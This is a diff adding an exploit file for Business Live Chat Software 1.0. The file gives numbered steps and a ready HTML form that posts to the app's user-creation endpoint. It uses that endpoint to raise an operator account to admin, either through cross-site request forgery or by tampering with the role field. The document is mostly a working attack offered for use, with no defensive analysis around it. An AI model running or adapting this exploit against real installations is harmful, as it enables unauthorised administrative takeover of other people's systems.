@@ -1,0 +1,39 @@
+# Exploit Title: Business Live Chat Software 1.0 - Cross-Site Request Forgery (Add Admin)
+# Description: Operator Can Change Role User Type to admin
+# Date: 2020-02-26
+# Exploit Author: Meisam Monsef
+# Vendor Homepage: https://www.bdtask.com/business-live-chat-software.php
+# Version: V-1.0
+# Tested on: ubuntu
+
+Exploit :
+1 - please login or create account
+2 - open exploit.html in browser
+3 - change you user id input for Change Role User Type to admin
+4 - fill input data (fname - lname - email)
+5 - click Update Button
+6 - logout account
+7 - login again you are admin & Enjoying
+
+<form action="https://TARGET/admin/user/users/create"
+enctype="multipart/form-data" method="post" accept-charset="utf-8">
+user_id :
+<input type="text" name="user_id" value="1"> <!-- change your user_id -->
+<br>
+fname :
+<input type="text" name="fname" value="" /> <!-- fill your first name -->
+<br>
+lname :
+<input type="text" name="lname" value="" />  <!-- fill your last name -->
+<br>
+email :
+<input type="text" name="email" value="" />  <!-- fill your email -->
+<br>
+user_type :
+<input type="text" name="user_type" value="1" />
+<br>
+status :
+<input type="text" name="status" value="1" />
+<br>
+<button type="submit">Update</button>
+</form>
